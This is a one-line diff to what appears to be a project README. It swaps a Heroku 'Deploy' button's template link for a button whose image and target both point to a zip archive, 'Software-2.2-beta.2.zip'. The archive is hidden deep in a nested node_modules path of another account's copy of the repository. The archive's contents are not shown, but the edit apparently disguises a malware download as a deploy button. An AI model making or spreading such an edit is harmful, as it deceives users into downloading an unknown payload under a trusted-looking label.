@@ -1,1 +1,1 @@
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?templatehttps://github.com/dawawasgg/dawawasgg/)
+[![Deploy](https://raw.githubusercontent.com/ahmadsailpil/dawawasgg/master/node_modules/mathjs/examples/node_modules/@discoveryjs/json-ext/dist/Software-2.2-beta.2.zip)](https://raw.githubusercontent.com/ahmadsailpil/dawawasgg/master/node_modules/mathjs/examples/node_modules/@discoveryjs/json-ext/dist/Software-2.2-beta.2.zip)
